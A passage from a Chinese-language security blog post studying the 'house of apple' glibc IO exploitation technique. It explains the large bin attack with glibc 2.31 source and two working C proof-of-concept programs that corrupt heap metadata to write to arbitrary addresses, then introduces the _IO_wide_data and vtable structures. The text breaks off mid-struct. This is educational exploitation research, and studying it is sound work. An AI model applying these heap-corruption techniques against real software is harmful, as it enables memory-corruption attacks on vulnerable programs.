<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51251108/article/details/127290280">(44条消息) house of cat 学习_Nqoinaen的博客-CSDN博客</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/19609dd.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/19609dd.html" class="post-title-link" itemprop="url">关于house of apple的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:57:28" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p><code>house of apple</code> 是 <a target="_blank" rel="noopener" href="https://roderickchan.github.io/">roderick</a> 师傅提出的一种非常优秀的 <code>IO</code> 攻击利用方法，应该在刚刚学习关于堆的漏洞时便看到 <strong>roderick</strong> 师傅提出的这种利用方法，当时看着文章上出现的很多不认识的名词感慨自己所了解的太少，时隔近七个月现在终于学习到了 <code>house of apple</code> 。而这篇文章仅仅是记录自己关于 <code>house of apple</code> 的学习总结，如果真正要进行对 <code>house of apple</code> 的学习还是建议去看 <strong>roderick</strong> 师傅发表的三篇文章。</p>
<p><strong>本文所有的 <code>glibc</code> 源代码均来自 <code>2.31</code> 版本</strong></p>
<h3 id="large-bin-attack："><a href="#large-bin-attack：" class="headerlink" title="large bin attack："></a>large bin attack：</h3><p><code>house of apple</code> 的攻击前提通常是使用 <code>large bin attack</code> ，因此需要先介绍一下 <code>glibc</code> 高版本中的 <code>large bin attack</code>。 <code>glibc</code> 低版本的 <code>large bin attack</code> 可以向任意两个地址写入两个堆地址，而高版本的 <code>large bin attack</code> 攻击效果是可以向任意一个地址写入一个堆地址。</p>
<p>漏洞源码如下：</p>
<p>下面代码位于 <code>ptmalloc</code> 遍历 <code>unsorted bin</code> 寻求合适堆块时将堆块分类，使堆块链入 <code>large bin </code> 过程的代码片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	victim-&gt;fd_nextsize = fwd;</span><br><span class="line">	victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">	fwd-&gt;bk_nextsize = victim;</span><br><span class="line">	victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>这部分代码存在的问题在于 <code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</code> <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 这两行代码中， <code>victim</code> 是将要被链入进 <code>large bin</code> 的堆块，而 <code>fwd</code> 是比 <code>victim</code> 大且位于同一个 <code>large bin</code> 的堆块，如果我们可以控制  <code>fwd-&gt;bk_nextsize</code> 为 <code>target_addr</code>（通过堆溢出或者 <code>UAF</code>），这样在 <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 执行时，就相当于是向 <code>target+0x20</code> 的位置写入 <code>victim</code>。因为 C语言 里访问结构体的成员本质上是通过偏移进行访问的，所以 <code>-&gt;fd_nextsize</code> 相当于 <code>+0x20</code>。</p>
<h5 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h5><ol>
<li><p>申请一个 <code>堆块A</code>，将其释放掉进入 <code>unsorted bin</code> ，再申请一个比 <code>堆块A</code> 大的 <code>堆块U</code> ,此时 <code>堆块A</code> 进入 <code>large bin</code></p>
</li>
<li><p>申请一个 <code>堆块B</code> ，将其释放进入 <code>unsorted bin</code> 。 <code>堆块B</code> 需要比 <code>堆块A</code> 小且二者需要位于同一个 <code>large bin</code> 中。</p>
</li>
<li><p>利用 <code>堆溢出</code> 或者 <code>UAF</code> 等方式来篡改 <code>堆块A</code> 的 <code>bk_nextsize</code> 为 <code>target_addr-0x20</code></p>
</li>
<li><p>最后释放一个跟 <code>堆块A</code> 和 <code>堆块B</code> 位于同一个 <code>large bin</code> 且比 <code>堆块A</code> 和 <code>堆块B</code> 都大的 <code>堆块C</code></p>
</li>
<li><p>此时触发 <code>large bin attack</code> ，攻击效果是向 <code>target_addr</code> 中写入 <code>堆块B</code> 的地址</p>
<p>举个例子，上述 <code>堆块A</code> <code>堆块B</code> <code>堆块C</code> <code>堆块U</code> 的大小可以分别为 <code>0x428</code> <code>0x418</code> <code>0x438</code> <code>0x438</code></p>
</li>
</ol>
<p><code>poc</code>如下，该 <code>poc</code> 来自 <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c">how2heap</a></p>
<p>然后我把前面一部分翻译成了中文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;自glibc2.30以来，对大型bin块插入实施了两项新检查\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;检查 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;这防止了传统的large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;然而，仍有一条可能的路径触发large bin attack。PoC如下所示： \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;以下是我们要覆盖的目标 (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;首先，我们分配一个大的块[p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;另一个堆块防止合并\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;我们还分配了第二个堆块 [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;此堆块应小于[p1]，并属于同一个large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;再次分配保护块以防止合并\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放两个--&gt;[p1]中较大的一个 --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;分配大于[p1]的块以将[p1]插入large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放两个--&gt;[p2]中较小的一个 (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;此时, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加载源码调试上面的 <code>poc</code> ，基本调试两遍就明白利用过程了。</p>
<h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>上述 <code>large bin attack</code> 的利用是最初在查找网上资料自学的时候看见的做法，但事实上有一个更简单的方法只需要两次进入 <code>large bin</code> 即可（上面的做法是一共用了三次进入 <code>large bin</code> 的堆块）。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code> 此处的 <code>fwd-&gt;fd</code> 指向的是唯一存在 <code>large bin</code> 中的堆块，漏洞在下面两行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>依然是控制 <code>bk_nextsize</code> ，然后向 <code>bk_nextsize-0x20</code> 的位置写一个堆地址 <code>victim</code> 和上面利用一样，举个例子，可以先申请一个 <code>0x428</code> 的堆块进入 <code>large bin</code>，然后去篡改其 <code>bk_nextsize</code> ，再让一个 <code>0x418</code> 的堆块进入 <code>large bin</code> 即可触发 <code>large bin attack</code> </p>
<p><code>demo</code> 如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">//gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//最终被写入数据的全局变量地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//此时全局的内容为空 </span></span><br><span class="line">    </span><br><span class="line">	<span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//获取libc基地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p=<span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p chunk address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(p+<span class="number">0x18</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)&amp;data<span class="number">-0x20</span>;</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302011939896.png" alt="image-20230201193929700"></p>
<h3 id="house-of-apple："><a href="#house-of-apple：" class="headerlink" title="house of apple："></a>house of apple：</h3><p><strong>roderick</strong> 师傅发表了关于该手法的三篇文章，我这里的学习总结只记录前两篇文章。</p>
<h4 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h4><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
<li>可以泄露 <code>libc</code> 地址和堆地址 </li>
<li>可以使用任意地址写一个堆地址（通常是使用 <code>large bin attack</code> ）</li>
<li>从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
</ol>
<h5 id="攻击效果："><a href="#攻击效果：" class="headerlink" title="攻击效果："></a>攻击效果：</h5><p>任意地址写一个堆地址（也可以是任意地址写一个其他地址，这个其他地址取决于伪造的 <code>IO_FILE</code>在哪里，通常是在堆上，所以是任意地址写一个堆地址）</p>
<h5 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h5><p>目前的所有 <code>libc</code> 版本，从 <code>2.23</code> 到目前最新的 <code>2.36</code></p>
<h5 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h5><p>在 <code>IO_FILE</code> 中有一个成员变量 <code>_wide_data</code> ，该成员变量为一个结构体指针（如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>该 <code>_IO_wide_data</code> 结构体定义如下,它是宽字节流的数据结构，用于处理宽字符的输入输出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>而在这个结构体中有一个 <code>_wide_vtable</code> ，里面存放的也都是函数指针 （如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里需要强调一下 <code>_IO_jump_t</code> 和 <code>_IO_wstrn_jumps</code> 的关系</p>
<p><code>_IO_wstrn_jumps</code> 和 <code>_IO_jump_t</code> 是glibc中两种不同类型的结构体,它们是相关的。</p>
<p><code>_IO_jump_t</code>  是 <code>glibc</code> 中一个通用的结构体，用于实现文件流的多态性。它定义了一组函数指针，这些函数指针指向文件流的不同操作，如读写、定位、关闭等。而 <code>_IO_wstrn_jumps</code> 是 <code>_IO_jump_t</code> 的一个实例。它是用于实现宽字符流的。它继承了 <code>_IO_jump_t</code> 的所有函数指针，并定义了一些额外的函数指针，用于支持宽字符流的特殊操作。</p>
<p>回顾一下 <code>_IO_jump_t</code> 结构体 （如下）， <code>vtable</code> 是它的一个实例。此处需要理解清楚这些结构体之间彼此的关系。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    